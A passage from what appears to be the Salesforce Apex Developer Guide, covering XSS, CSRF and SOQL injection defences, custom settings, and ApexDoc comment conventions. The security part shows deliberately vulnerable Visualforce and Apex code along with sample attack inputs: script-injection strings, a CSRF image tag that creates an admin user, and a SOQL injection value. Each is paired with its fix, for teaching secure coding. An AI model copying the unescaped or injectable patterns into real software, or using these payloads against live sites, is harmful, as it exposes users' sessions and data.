browser can execute the attacker's script in a trusted context. With this ability, the attacker can perform a wide variety of attacks against
the victim. These attacks range from simple actions, such as opening and closing windows, to more malicious attacks, such as stealing
data or session cookies, which allow an attacker full access to the victim's session.

For more information on this type of attack:

**•** [http://www.owasp.org/index.php/Cross_Site_Scripting](http://www.owasp.org/index.php/Cross_Site_Scripting)

**•** [http://www.cgisecurity.com/xss-faq.html](http://www.cgisecurity.com/xss-faq.html)

**•** [http://www.owasp.org/index.php/Testing_for_Cross_site_scripting](http://www.owasp.org/index.php/Testing_for_Cross_site_scripting)

**•** [http://www.google.com/search?q=cross-site+scripting](http://www.google.com/search?q=cross-site+scripting)

Within the Lightning Platform, several anti-XSS defenses are in place. For example, Salesforce has filters that screen out harmful characters
in most output methods. For the developer using standard classes and output methods, the threats of XSS flaws are largely mitigated.
But the creative developer can still find ways to intentionally or accidentally bypass the default controls.

Existing Protection

All standard Visualforce components, which start with `<apex>`, have anti-XSS filters in place to screen out harmful characters. For
example, this code is normally vulnerable to an XSS attack because it takes user-supplied input and outputs it directly back to the user,
but the `<apex:outputText>` tag is XSS-safe. All characters that appear to be HTML tags are converted to their literal form. For
example, the < character is converted to `&lt;` so that a literal < appears on the user's screen.

```
   <apex:outputText>

      {!$CurrentPage.parameters.userInput}

   </apex:outputText>

```

Disabling Escape on Visualforce Tags

By default, nearly all Visualforce tags escape the XSS-vulnerable characters. You can disable this behavior by setting the optional attribute
`escape="false"` . For example, this output is vulnerable to XSS attacks.

```
   <apex:outputText escape="false" value="{!$CurrentPage.parameters.userInput}" />

```

Programming Items Not Protected from XSS

Custom Javascript code and code within `<apex:includeScript>` components don’t have built-in XSS protections. These items
allow the developer to customize the page with script commands. It doesn’t makes sense to include anti-XSS filters on commands that
are intentionally added to a page.

If you write your own JavaScript, the Lightning Platform has no way to protect you. For example, this code is vulnerable to XSS if used
in JavaScript.

```
   <script>

      var foo = location.search;

      document.write(foo);

   </script>

```

With the `<apex:includeScript>` Visualforce component, you can include a custom script on a page. Make sure to validate that
the content is safe and includes no user-supplied data. For example, this snippet is vulnerable because it includes user-supplied input
as the value of the script text. The value provided by the tag is a URL to the JavaScript to include. If an attacker can supply arbitrary data
to this parameter as in the example, they’re able to direct the victim to include any JavaScript file from any other website.

```
   <apex:includeScript value="{!$CurrentPage.parameters.userInput}" />

```


Apex Developer Guide Working with Data in Apex

###### Unescaped Output and Formulas in Visualforce Pages

When using components that have set the `escape` attribute to false, or when including formulas outside of a Visualforce component,
output is unfiltered and must be validated for security. This is especially important when using formula expressions.

Formula expressions can be function calls or include information about platform objects, a user's environment, system environment,
and the request environment. It’s important to be aware that the output that’s generated by expressions isn’t escaped during rendering.
Since expressions are rendered on the server, it’s not possible to escape rendered data on the client using JavaScript or other client-side
technology. This can lead to potentially dangerous situations if the formula expression references non-system data (that is, potentially
hostile or editable data) and the expression itself is not wrapped in a function to escape the output during rendering.

A common vulnerability is created by rerendering user input on a page. For example,

```
   <apex:page standardController="Account">

     <apex:form>

      <apex:commandButton rerender="outputIt" value="Update It"/>

      <apex:inputText value="{!myTextField}"/>

     </apex:form>

     <apex:outputPanel id="outputIt">

      Value of myTextField is <apex:outputText value="{!myTextField}" escape="false"/>

     </apex:outputPanel>

   </apex:page>

```

The unescaped `{!myTextField}` results in a cross-site scripting vulnerability. For example, if the user enters :

```
   <script>alert('xss')

```

and clicks **Update It**, the JavaScript is executed. In this case, an alert dialog is displayed, but more malicious uses could be designed.

There are several functions that you can use for escaping potentially insecure strings.

**HTMLENCODE**
Encodes text and merge field values for use in HTML by replacing characters that are reserved in HTML, such as the greater-than
sign (>), with HTML entity equivalents, such as `&gt;` .

**JSENCODE**
Encodes text and merge field values for use in JavaScript by inserting escape characters, such as a backslash (\), before unsafe
JavaScript characters, such as the apostrophe (').

**JSINHTMLENCODE**
Encodes text and merge field values for use in JavaScript inside HTML tags by replacing characters that are reserved in HTML with
HTML entity equivalents and inserting escape characters before unsafe JavaScript characters. `JSINHTMLENCODE(` _**`someValue`**_ `)`
is a convenience function that is equivalent to `JSENCODE(HTMLENCODE((` _**`someValue`**_ `))` . That is, `JSINHTMLENCODE`
first encodes _`someValue`_ with `HTMLENCODE`, and then encodes the result with `JSENCODE` .

**URLENCODE**
Encodes text and merge field values for use in URLs by replacing characters that are illegal in URLs, such as blank spaces, with the
code that represent those characters as defined in _RFC 3986, Uniform Resource Identifier (URI): Generic Syntax_ . For example, blank
spaces are replaced with `%20`, and exclamation points are replaced with `%21` .

To use `HTMLENCODE` to secure the previous example, change the `<apex:outputText>` to the following:

```
   <apex:outputText value=" {!HTMLENCODE(myTextField)}" escape="false"/>

```

If a user enters `<script>alert('xss')` and clicks **Update It**, the JavaScript is not be executed. Instead, the string is encoded
and the page displays `Value of myTextField is <script>alert('xss')` .


Apex Developer Guide Working with Data in Apex

Depending on the placement of the tag and usage of the data, both the characters needing escaping as well as their escaped counterparts
may vary. For instance, this statement, which copies a Visualforce request parameter into a JavaScript variable:

```
   <script>var ret = "{!$CurrentPage.parameters.retURL}";</script>

```

requires that any double quote characters in the request parameter be escaped with the URL encoded equivalent of `%22` instead of
the HTML escaped `"` . Otherwise, the request:

```
   https://example.com/demo/redirect.html?retURL=%22foo%22%3Balert('xss')%3B%2F%2F

```

results in:

```
   <script>var ret = "foo";alert('xss');//";</script>

```

When the page loads the JavaScript executes, and the alert is displayed.

In this case, to prevent JavaScript from being executed, use the `JSENCODE` function. For example

```
   <script>var ret = "{!JSENCODE($CurrentPage.parameters.retURL)}";</script>

```

Formula tags can also be used to include platform object data. Although the data is taken directly from the user's organization, it must
still be escaped before use to prevent users from executing code in the context of other users (potentially those with higher privilege
levels). While these types of attacks must be performed by users within the same organization, they undermine the organization's user
roles and reduce the integrity of auditing records. Additionally, many organizations contain data which has been imported from external
sources and might not have been screened for malicious content.

###### Cross-Site Request Forgery (CSRF) Cross-Site Request Forgery (CSRF) flaws are less a programming mistake and more a lack of a defense. For example, an attacker has a

web page at `www.attacker.com` that could be any web page, including one that provides valuable services or information that
drives traffic to that site. Somewhere on the attacker's page is an HTML tag that looks like this:

```
   <img

   src="http://www.yourwebpage.com/yourapplication/createuser?email=attacker@attacker.com&type=admin....."

    height=1 width=1 />

```

In other words, the attacker's page contains a URL that performs an action on your website. If the user is still logged into your web page
when they visit the attacker's web page, the URL is retrieved and the actions performed. This attack succeeds because the user is still
authenticated to your web page. This attack is a simple example, and the attacker can get more creative by using scripts to generate
the callback request or even use CSRF attacks against your AJAX methods.

For more information and traditional defenses:

**•** [http://www.owasp.org/index.php/Cross-Site_Request_Forgery](http://www.owasp.org/index.php/Cross-Site_Request_Forgery)

**•** [http://www.cgisecurity.com/csrf-faq.html](http://www.cgisecurity.com/csrf-faq.html)

**•** [http://shiflett.org/articles/cross-site-request-forgeries](http://shiflett.org/articles/cross-site-request-forgeries)

Within the Lightning Platform, Salesforce implemented an anti-CSRF token to prevent such an attack. Every page includes a random
string of characters as a hidden form field. Upon the next page load, the application checks the validity of this string of characters and
doesn’t execute the command unless the value matches the expected value. This feature protects you when using all of the standard
controllers and methods.

Here again, the developer can bypass the built-in defenses without realizing the risk. For example, a custom controller takes the object
ID as an input parameter and then uses that input parameter in a SOQL call.

```
   <apex:page controller="myClass" action="{!init}"</apex:page>

```


Apex Developer Guide Working with Data in Apex

```
   public class myClass {

     public void init() {

      Id id = ApexPages.currentPage().getParameters().get('id');

      Account obj = [select id, Name FROM Account WHERE id = :id];

      delete obj;

      return ;

     }

   }

```

The developer unknowingly bypassed the anti-CSRF controls by developing their own action method. The `id` parameter is read and
used in the code. The anti-CSRF token is never read or validated. An attacking web page can send the user to this page by using a CSRF
attack and providing any value for the `id` parameter.

There are no built-in defenses for such situations, and developers must be cautious about writing pages that act based on a user-supplied
parameter like the `id` variable in the previous example. A possible work-around is to insert an intermediate confirmation page to make
sure that the user intended to call the page. Other suggestions include shortening the idle session timeout and educating users to log
out of their active session and not use their browser to visit other sites while authenticated.

Because of the Salesforce built-in defense against CSRF, your users can encounter an error when multiple Salesforce login pages are
open. If the user logs in to Salesforce in one tab and then attempts to log in on another, they see this error: The page you submitted was
invalid for your session. Users can successfully log in by refreshing the login page or by attempting to log in a second time.

###### SOQL Injection

In other programming languages, the previous flaw is known as SQL injection. Apex doesn’t use SQL, but uses its own database query
language, SOQL. SOQL is simpler and more limited in functionality than SQL. The risks are lower for SOQL injection than for SQL injection,
but the attacks are nearly identical to traditional SQL injection. SQL/SOQL injection takes user-supplied input and uses those values in
a dynamic SOQL query. If the input isn’t validated, it can include SOQL commands that effectively modify the SOQL statement and trick
the application into performing unintended commands.

###### SOQL Injection Vulnerability in Apex

Here’s a simple example of Apex and Visualforce code vulnerable to SOQL injection.

```
   <apex:page controller="SOQLController" >

      <apex:form>

        <apex:outputText value="Enter Name" />

        <apex:inputText value="{!name}" />

        <apex:commandButton value="Query" action="{!query}“ />

      </apex:form>

   </apex:page>

   public class SOQLController {

      public String name {

        get { return name;}

        set { name = value;}

      }

      public PageReference query() {

        String qryString = 'SELECT Id FROM Contact WHERE ' +

           '(IsDeleted = false and Name like \'%' + name + '%\')';

        List<Contact> queryResult = Database.query(qryString);

        System.debug('query result is ' + queryResult);

        return null;

      }

   }

```


Apex Developer Guide Working with Data in Apex

This simple example illustrates the logic. The code is intended to search for contacts that weren’t deleted. The user provides one input
value called `name` . The value can be anything provided by the user, and it’s never validated. The SOQL query is built dynamically and
then executed with the `Database.query` method. If the user provides a legitimate value, the statement executes as expected.

```
   // User supplied value: name = Bob

   // Query string

   SELECT Id FROM Contact WHERE (IsDeleted = false and Name like '%Bob%')

```

But what if the user provides unexpected input, such as:

```
   // User supplied value for name: test%') OR (Name LIKE '

```

In that case, the query string becomes:

```
   SELECT Id FROM Contact WHERE (IsDeleted = false AND Name LIKE '%test%') OR (Name LIKE '%')

```

Now the results show all contacts, not just the non-deleted ones. A SOQL Injection flaw can be used to modify the intended logic of any
vulnerable query.

SOQL Injection Defenses

To prevent a SOQL injection attack, avoid using dynamic SOQL queries. Instead, use static queries and binding variables. The preceding
vulnerable example can be rewritten using static SOQL.

```
   public class SOQLController {

      public String name {

        get { return name;}

        set { name = value;}

      }

      public PageReference query() {

        String queryName = '%' + name + '%';

        List<Contact> queryResult = [SELECT Id FROM Contact WHERE

          (IsDeleted = false and Name like :queryName)];

        System.debug('query result is ' + queryResult);

        return null;

      }

   }

```

If you must use dynamic SOQL, use the `escapeSingleQuotes` method to sanitize user-supplied input. This method adds the
escape character (\) to all single quotation marks in a string that is passed in from a user. The method ensures that all single quotation
marks are treated as enclosing strings, instead of database commands.

###### Data Access Control

The Salesforce Platform makes extensive use of data sharing rules. Each object has permissions and can have sharing settings that users
can read, create, edit, and delete. These settings are enforced when using all standard controllers.

When using an Apex class, the default behavior is tp respect built-in user permissions and field-level security restrictions during execution,
that is, as if the class were declared as `with sharing` . For example, consider this Apex pseudo-code.

```
   public class customController {

      public void read() {

        Contact contact = [SELECT id FROM Contact WHERE Name = :value];

      }

   }

```


Apex Developer Guide Working with Data in Apex

In this case, only contact records for the current user are searched.

The platform uses the security sharing permissions of the user currently logged in, rather than granting full access to all records.

#### Custom Settings

Custom settings are similar to custom objects. Application developers can create custom sets of data and associate custom data for an
organization, profile, or specific user. All custom settings data is exposed in the application cache, which enables efficient access without
the cost of repeated queries to the database. Formula fields, validation rules, flows, Apex, and SOAP API can then use this data.

Warning: Protection only applies to custom settings that are marked protected and installed to a subscriber organization as part
of a managed package. Otherwise, they are treated as public custom settings and are readable for all profiles, including the guest
user. Do not store secrets, personally identifying information, or any private data in these settings. Use protected custom settings
only in managed packages. Outside of a managed package, use named credentials or encrypted custom fields to store secrets like
OAuth tokens, passwords, and other confidential material.

Note: While custom settings data is included in sandbox copies, it is treated as data for the purposes of Apex test isolation. Apex
tests must use `SeeAllData=true` to see existing custom settings data in the organization. As a best practice, create the
required custom settings data in your test setup.

There are two types of custom settings.

**List Custom Settings**
A type of custom setting that provides a reusable set of static data that can be accessed across your organization. If you use a particular
set of data frequently within your application, putting that data in a list custom setting streamlines access to it. Data in list settings
doesn’t vary with profile or user, but is available organization-wide. Examples of list data include two-letter state abbreviations,
international dialing prefixes, and catalog numbers for products. Because the data is cached, access is low-cost and efficient: you
don't have to use SOQL queries that count against your governor limits.

**Hierarchy Custom Settings**
A type of custom setting that uses a built-in hierarchical logic that lets you “personalize” settings for specific profiles or users. The
hierarchy logic checks the organization, profile, and user settings for the current user and returns the most specific, or “lowest,” value.
In the hierarchy, settings for an organization are overridden by profile settings, which, in turn, are overridden by user settings.

To get custom setting data set record based on the lowest level fields defined in the hierarchy, use the `[getinstance()](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_custom_settings.htm#apex_System_HierarchyCustomSetting_getInstance)` instance
method for hierarchy custom settings.

The following examples illustrate how you can use custom settings.

**•** A shipping application requires users to fill in the country codes for international deliveries. By creating a list setting of all country
codes, users have quick access to this data without needing to query the database.

**•** An application displays a map of account locations, the best route to take, and traffic conditions. This information is useful for sales
reps, but account executives only want to see account locations. By creating a hierarchy setting with custom checkbox fields for
route and traffic, you can enable this data for just the “Sales Rep” profile.

#### You can create a custom setting in the Salesforce user interface: from Setup, enter Custom Settings in the Quick Find box, then select Custom Settings . After creating a custom setting and you’ve added fields, provide data to your custom setting by clicking Manage

from the detail page. Identify each data set with a name.

For example, if you have a custom setting named Foundation_Countries__c with one text field Country_Code__c, your data sets can
look like the following:

Data Set Name Country Code Field Value

United States USA


### Apex Developer Guide Document Your Apex Code

Canada CAN

United Kingdom GBR

You can also include a custom setting in a package. The visibility of the custom setting in the package depends on the `Visibility`
setting.

Note: Only custom settings definitions are included in packages, not data. To include data, you must populate the custom settings
using Apex code run by the subscribing organization after they’ve installed the package.

Apex can access both custom setting types—list and hierarchy.

Note: If **Privacy** for a custom setting is `Protected` and the custom setting is contained in a managed package, the subscribing
organization can’t edit the values or access them using Apex.

Accessing a List Custom Setting

The following example returns a map of custom settings data. The `getAll` method returns values for all custom fields associated with
the list setting.

```
   Map< String_dataset_name, CustomSettingName __c> mcs = CustomSettingName __c.getAll();

```

The following example uses the `getValues` method to return all the field values associated with the specified data set. This method
can be used with both list and hierarchy custom settings, using different parameters.

```
   CustomSettingName __c mc = CustomSettingName __c.getValues( data_set_name );

```

Accessing a Hierarchy Custom Setting

The following example uses the `getOrgDefaults` method to return the data set values for the organization level:

```
   CustomSettingName __c mc = CustomSettingName __c.getOrgDefaults();

```

The following example uses the `getInstance` method to return the data set values for the specified profile. The `getInstance`
method can also be used with a user ID.

```
   CustomSettingName __c mc = CustomSettingName __c.getInstance( Profile_ID );

```

SEE ALSO:

_Apex Reference Guide_ [: Custom Settings Methods](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_custom_settings.htm)

### Document Your Apex Code

ApexDoc is a standardized comment format that makes it easier for humans, documentation generators, and AI agents to understand
your codebase. We recommend using ApexDoc comments to facilitate code collaboration and increase long-term code maintainability.
Based on the JavaDoc standard, ApexDoc provides specifications, such as specialized tags and guidelines, that are tailored to Apex and
the Salesforce ecosystem.


Apex Developer Guide Document Your Apex Code

#### ApexDoc Comment Structure and Tags

To promote consistency and parsability, ApexDoc comments have a defined structure and syntax. Each ApexDoc comment consists
of a main description and a set of block and inline tags that provide information about the documented code element.

Document Apex Constructs and Features
Apex has unique constructs and platform-specific features that require particular attention in documentation. Use these guidelines
to document these elements with ApexDoc.

ApexDoc Examples
See practical examples of ApexDoc comments applied to various Apex constructs.

#### ApexDoc Comment Structure and Tags

To promote consistency and parsability, ApexDoc comments have a defined structure and syntax. Each ApexDoc comment consists of
a main description and a set of block and inline tags that provide information about the documented code element.

Important: Although the Apex compiler enforces existing Apex comment syntax on page 50, it doesn’t enforce the ApexDoc
syntax or check comment accuracy in relation to corresponding Apex code.

Basic Comment Format

ApexDoc comments are distinguished from other Apex comments on page 50 by their starting delimiter. Whereas other multiline
comments demarcate the beginning and end of the comment block with `/*` and `*/`, ApexDoc comments begin with /** and end
with */.

An ApexDoc comment immediately precedes the class, interface, enum, method, constructor, or property declaration that it documents.
No other code or comments are between the ApexDoc comment block and the element that it describes.

If an ApexDoc comment spans multiple lines, each subsequent line begins with an asterisk ( `*` ). Documentation parsers ignore the leading
asterisk and any whitespace that precedes it on the line.

```
   /**

    * This is a simple ApexDoc comment.

    */

   public with sharing class MyClass {

      //...

   }

```

Main Description

The main description is the first block of text within an ApexDoc comment. It doesn’t have an explicit tag. It provides a concise summary
of the documented element.

In the main description, first include a one-sentence summary of the element. Documentation generation tools often extract this first
sentence to use in summary tables or indexes. End the summary sentence with a period.

After the summary sentence, include any additional context about the element. For example, explain pre- or post- conditions, link to
relevant documents, or describe variable constraints.

Block and Inline Tags

Block tags and inline tags provide structured information about the element.


Apex Developer Guide Document Your Apex Code

Use block tags after the main description of the ApexDoc comment. Block tags begin with the `@` symbol followed by the tag name,
such as `@param`, `@return`, and `@author` . Each block tag appears on a new line, and the information associated with a block tag
follows the tag name on the same line or subsequent lines.

Use inline tags within the main description or within the description of a block tag. Inline tags also begin with the `@` symbol followed
by the tag name, but the tags are enclosed in curly braces ( `{@...}` ).

This table provides a comprehensive ApexDoc tag reference.

**Table 3: ApexDoc Tags**


Apex Developer Guide Document Your Apex Code


Apex Developer Guide Document Your Apex Code


Apex Developer Guide Document Your Apex Code

SEE ALSO:

#### Document Apex Constructs and Features

ApexDoc Examples

#### Document Apex Constructs and Features

Apex has unique constructs and platform-specific features that require particular attention in documentation. Use these guidelines to
document these elements with ApexDoc.

Classes

When you document an Apex class on page 62, provide a comprehensive overview of the class’s purpose, responsibilities, and key
characteristics.

In the summary sentence, describe the class’s overall purpose. After the summary sentence, explain the rationale for the class’s sharing
model on page 90 if it’s not obvious. For example, explain why the class uses `without sharing` for a specific privileged operation.
We also recommend using tags such as `@author`, `@version`, `@since`, `@see,` and `@group`, which all provide valuable metadata.

Here’s an example ApexDoc comment for the `DataAggregationService` class.

```
/**

 * This service class handles critical data aggregation tasks.

 * It operates using 'without sharing' to ensure access to all necessary

 * records for calculation, irrespective of the running user's sharing rules.

 * Care must be taken when calling methods from this class.

 * @author Jane Doe

 * @since 0.1.0

 */

public without sharing class DataAggregationService {

   //...

}

```

Interfaces

Apex interfaces on page 82 define a contract for what other classes can do without specifying how they do it. Focus your ApexDoc
comments on this contract. In the main description, document the interface’s overall purpose and the contract that it defines. Standard
metadata tags such as `@author`, `@version`, `@since`, and `@see` are also applicable.

Document each method declaration in the interface as a standard method. Clearly explain the method’s expected behavior, parameters,
and return values. This documentation sets expectations for any class that implements the interface.

For an example of an interface with an ApexDoc comment, see ApexDoc Examples on page 253.


Apex Developer Guide Document Your Apex Code

Enums

Enums on page 34 in Apex define an abstract data type with a finite set of named constant values. In the main description, document
the enum’s purpose and the set of concepts that it represents. You can also use standard tags such as `@author`, `@version`, `@since`,
and `@see` .

Clarify individual enum constants if their names aren’t self-explanatory. Either describe a constant’s definition in the enum type’s ApexDoc
main description, or use standard block comments that directly precede the line for the constant.

Apex enums implicitly include methods such as `values()`, `valueOf(String)`, `name()`, and `ordinal()` . These standard
methods generally don’t require explicit documentation within each specific enum’s ApexDoc comment.

Here’s an example ApexDoc comment for the `Season` enum.

```
   /**

    * Potential seasons of the year

    */

   public enum Season {

     WINTER,

     SPRING,

     SUMMER,

     FALL

   }

```

Methods and Constructors

Method on page 65 and constructor on page 68 documentation is critical for understanding how to use an Apex class.

When you document method and constructor parameters, use the `@param` block tag. Each parameter must have a corresponding
`@param` tag. In the parameter description, describe the parameter’s name, its purpose, and any expectations regarding its type or
content. Descriptions can include statements such as “Cannot be null” or “A valid 18-character ID”.

For methods that return values, use the `@return` block tag. In the description, specify what is returned, including conditions for null
values or specific data structures. Descriptions can include statements such as “A List of Account sObjects matching the filter criteria; an
empty list if no matches are found.”

Use the `@throws` block tag to list all significant checked and unchecked exceptions that the method can explicitly throw, along with
the conditions causing them. This documentation is crucial for identifying gaps in error handling.

For examples of methods and constructors with ApexDoc comments, see ApexDoc Examples on page 253.

Properties and Variables

Document public or global properties and class member variables that form part of a class’s public API.

In the ApexDoc comment’s main description section, explain the property’s purpose, its data type if it’s unclear from the method
declaration, and any important usage notes. For example, include whether the property is read-only after initialization, or its default
value. Block tags such as `@see`, `@since`, and `@deprecated` can also be applicable.

Here’s an example ApexDoc comment for the public `maxRetries` variable.

```
   /**

    * Stores the maximum number of retry attempts for an operation.

    * Defaults to 3 if not explicitly set.

    * @since 0.1.1

    */

   public Integer maxRetries {

     get {

```


Apex Developer Guide Document Your Apex Code

```
      return maxRetries ?? 3;

     }

     set { maxRetries = value; }

   }

```

Triggers

Apex triggers on page 266 are event-driven pieces of code that execute in response to specific database operations. Apex trigger
definitions provide significant context, so we strongly recommend that you delegate all business logic to a separate handler class or a
trigger framework. Therefore, ApexDoc doesn’t have any trigger-specific comment specifications.

However, you can still include standard ApexDoc tags such as `@since` and `@see` . For example, here’s a ApexDoc comment for the
`Opportunity` trigger.

```
   /**

    * @since 1.3.2

    */

   trigger OpportunityTrigger on Opportunity (

     before insert,

     after insert,

     before update,

     after update,

     before delete,

     after delete,

     after undelete

   ) {

     new OpportunityTriggerHandler().run();

   }

```

Annotations

Apex annotations on page 92, such as `@AuraEnabled` and `@Future`, modify the way a class or method is used by the platform
and other code. For an element that has an annotation, document the implications of that annotation for the element’s behavior or
usage.

Refer to this table as you write ApexDoc comments for elements with Apex annotations.

**Table 4: Document Common Apex Annotations**


Apex Developer Guide Document Your Apex Code

SEE ALSO:

ApexDoc Comment Structure and Tags

#### ApexDoc Examples ApexDoc Examples

See practical examples of ApexDoc comments applied to various Apex constructs.

Class Example

```
/**

 * Manages customer account information and related operations.

 * This class bypasses user record access via 'without sharing' so that it

 * can be used in a batch classes.

 * @author John Developer

 * @since 0.1.0

 * @version 0.3.1

 * @see AccountProcessingBatch

 * @group Account

 * @example

 * {@code

 * Account a;

 * try {

 * a = new AccountManager().createAccount('Acme', 'Agriculture');

 * } catch (AccountManager.AccountException caught) {

```


Apex Developer Guide Document Your Apex Code

```
    * LOGGER.log(caught);

    * // further exception handling

    * }

    * }

    */

   public without sharing class AccountManager {

      /**

      * The default region for new accounts if not specified.

      */

      public static final String DEFAULT_REGION = 'North America';

      /**

      * Stores the count of active accounts managed by this instance.

      * Populated after using the {@link AccountService}.

      */

      @TestVisible

      private Integer activeAccountCount;

      /**

      * Creates a new Account sObject with the given name and industry.

      * @param accountName The desired name for the new account. Cannot be null or empty.

      * @param industry The industry classification for the new account.

      * @return The newly created Account sObject with its ID populated.

      * @throws AccountManager.AccountException if accountName is invalid

      * or if DML operation fails.

      */

      public Account createAccount(String accountName, String industry) {

        if (String.isBlank(accountName)) {

           throw new AccountManager.AccountException('Account name cannot be blank.');

        }

        Account acc = new Account(Name = accountName, Industry = industry);

        // Potentially more logic here

        try {

           insert acc;

        } catch (DmlException e) {

           throw new AccountManager.AccountException(

             'Failed to create account: ' + e.getMessage()

           );

        }

        return acc;

      }

      // more methods...

      /**

      * Represents an exception specific to AccountManager operations.

      * @example

      * {@code

      * throw new AccountManager.AccountException('Account not found with provided Id.');

      * }

      */

      public class AccountException extends Exception {}

   }

```


Apex Developer Guide Document Your Apex Code

Packaged Class Example

```
   /**

    * Provides services for geolocation and address conversion.

    * @author Dennis Smith

    * @version 0.3.0

    * @since 0.1.0

    */

   global with sharing class GeolocationService {

     /**

     * Represents geographic coordinates (latitude and longitude).

     */

     global class Coordinates {

      @AuraEnabled

      public Decimal latitude;

      @AuraEnabled

      public Decimal longitude;

      global Coordinates(Decimal lat, Decimal lon) {

       this.latitude = lat;

       this.longitude = lon;

      }

     }

     /**

     * Converts a full address string to approximate latitude

     * and longitude coordinates. This method is deprecated and should no

     * longer be used due to its reliance on an older, less accurate geocoding

     * service and simpler parsing logic. It may not handle all address formats

     * correctly and has a lower success rate.

     * @param fullAddress The complete address string

     * (e.g., "123 Main St, Anytown, CA 90210, USA").

     * @return A `Coordinates` object representing the approximate latitude and longitude.

     * @throws DeprecatedMethodCalledException If this method is invoked,

     * informing the user to migrate to the newer, more robust `geocodeAddress` method.

     * @deprecated in 0.2.0. Use {@link #geocodeAddress(

     * String street,

     * String city,

     * String state,

     * String postalCode,

     * String country)} instead.

     * @since 0.1.0

     */

     @Deprecated

     global static Coordinates convertAddressToCoordinates(String fullAddress) {

      throw new DeprecatedMethodCalledException(

       'The method `GeolocationService.convertAddressToCoordinates(String fullAddress)` is

    deprecated. ' +

        'Please use `GeolocationService.geocodeAddress(String street, String city, String

    state, String postalCode, String country)` ' +

        'for all new and existing address-to-coordinate conversions to ensure better

   accuracy and reliability.'

      );

     }

```


Apex Developer Guide Document Your Apex Code

```
     /**

     * Geocodes a structured address into precise latitude and longitude coordinates

     * using a robust external geocoding service.

     * This method provides higher accuracy and better handling of diverse address formats.

     * @param street The street address (e.g., "123 Main St").

     * @param city The city (e.g., "Anytown").

     * @param state The state or province abbreviation (e.g., "CA").

     * @param postalCode The postal or ZIP code (e.g., "90210").

     * @param country The country name or code (e.g., "USA").

     * @return A Coordinates object containing the latitude and longitude.

     * @throws GeocodingException If the address cannot be geocoded,

     * if the external service is unavailable, or if required address

     * components are missing.

     * @example

     * {@code

     * try {

     * GeolocationService.Coordinates coords = GeolocationService.geocodeAddress(

     * '415 Mission St',

     * 'San Francisco',

     * 'CA',

     * '94105',

     * 'USA'

     * );

     * } catch (GeolocationService.GeocodingException e) {

     * // handle failure

     * }

     * }

     * @since 0.2.0

     */

     global static Coordinates geocodeAddress(

      String street,

      String city,

      String state,

      String postalCode,

      String country

     ) {

      // Implement actual geocoding logic

      return new Coordinates(0, 0);

     }

     /**

     * Exception thrown when a deprecated method is called.

     * This indicates that the caller should migrate to the recommended alternative.

     */

     global class DeprecatedMethodCalledException extends Exception {

     }

     /**

     * Exception thrown when a geocoding operation fails.

     * This provides specific context for issues during address-to-coordinate conversion.

     */

     global class GeocodingException extends Exception {

```


Apex Developer Guide Document Your Apex Code

```
     }

   }

```

Test Class Example

```
   /**

    * Specifications for the GeolocationService

    * @author Jane Devington

    * @version 0.2.0

    * @see GeolocationService

    * @since 0.1.0

    */

   @IsTest

   private class GeolocationServiceTest {

     /**

     * Verifies that known addresses are correctly geocoded to their expected coordinates.

     * @see GeolocationService#geocodeAddress(

     * String street,

     * String city,

     * String state,

     * String postalCode,

     * String country)

     */

     @IsTest

     private static void validAddressShouldReturnCorrectCoordinates() {

      String street = '415 Mission Street';

      String city = 'San Francisco';

      String state = 'CA';

      String postalCode = '94105';

      String country = 'USA';

      GeolocationService.Coordinates coords;

      Test.startTest();

      coords = GeolocationService.geocodeAddress(

       street,

       city,

       state,

       postalCode,

       country

      );

      Test.stopTest();

      Assert.isNotNull(

       coords,

       'Coordinates should not be null for a valid address.'

      );

      Assert.areEqual(

       37.785834,

       coords.latitude,

       'Latitude should match for Salesforce tower.'

      );

      Assert.areEqual(

       -122.406417,

```


Apex Developer Guide Document Your Apex Code

```
       coords.longitude,

       'Longitude should match for Salesforce tower.'

      );

     }

     /**

     * Verifies that calling the geocodeAddress with missing required parameters

     * throws a GeocodingException.

     * @see GeolocationService#geocodeAddress(

     * String street,

     * String city,

     * String state,

     * String postalCode,

     * String country)

     * @see GeolocationService#GeocodingException

     */

     @IsTest

     private static void missingRequiredParametersShouldThrowGeocodingException() {

      String street = ''; // Missing

      String city = 'San Francisco';

      String state = 'CA';

      String postalCode = 94105;

      String country = 'USA';

      Test.startTest();

      Boolean caughtException = false;

      try {

       GeolocationService.geocodeAddress(

        street,

        city,

        state,

        postalCode,

        country

       );

      } catch (GeolocationService.GeocodingException e) {

       caughtException = true;

       Assert.areEqual(

        'Street, City, and Postal Code are required for geocoding.',

        e.getMessage(),

        'Exception message should indicate missing required fields.'

       );

      }

      Test.stopTest();

      Assert.isTrue(

       caughtException,

       'GeocodingException should have been thrown for missing street.'

      );

     }

     /**

     * Verifies that calling the deprecated method throws a

     * DeprecatedMethodCalledException.

     * @see GeolocationService#convertAddressToCoordinates(String address)

```


Apex Developer Guide Document Your Apex Code

```
     * @see GeolocationService#DeprecatedMethodCalledException

     */

     @IsTest

     private static void deprecatedMethodCallShouldThrowDeprecatedMethodCalledException() {

      String oldAddress = '123 Deprecated Lane';

      Test.startTest();

      Boolean caughtException = false;

      try {

       GeolocationService.convertAddressToCoordinates(

        oldAddress

       );

      } catch (GeolocationService.DeprecatedMethodCalledException e) {

       caughtException = true;

       Assert.isTrue(

        e.getMessage().contains('is deprecated'),

        'Exception message should indicate deprecation.'

       );

       Assert.isTrue(

        e.getMessage().contains('Please use'),

        'Exception message should suggest new method.'

       );

      }

      Test.stopTest();

      Assert.isTrue(

       caughtException,

       'DeprecatedMethodCalledException should have been thrown.'

      );

     }

   }

```

Interface Example

```
   /**

    * Defines a contract for objects that can be serialized to a

    * specific format. Implementations must provide logic for converting

    * their state into a string representation.

    * @author Jane Coder

    * @since 0.2.0

    */

   public interface ISerializable {

      /**

      * Serializes the object's current state into a String.

      * @return A String representation of the object.

      * @throws SerializationException if the object cannot be serialized.

      */

      String serialize();

      /**

      * Gets the format name this serializer supports (e.g., "JSON", "XML").

      * @return The name of the serialization format.

      */

```


Apex Developer Guide Document Your Apex Code

```
      String getFormatName();

   }

```

Enum Example

```
   /**

    * Represents the possible status levels for a support case.

    * Defines standard values for case progression in the customer portal.

    * @author John Developer

    * @since 0.1.5

    */

   public enum CaseStatus {

     /* A newly opened case, not yet assigned. */

     BRAND_NEW,

     /* Case is actively being worked on. */

     WORKING,

     /* Case has been escalated to a higher tier. */

     ESCALATED,

     /* Case has been resolved and closed. */

     CLOSED

   }

```

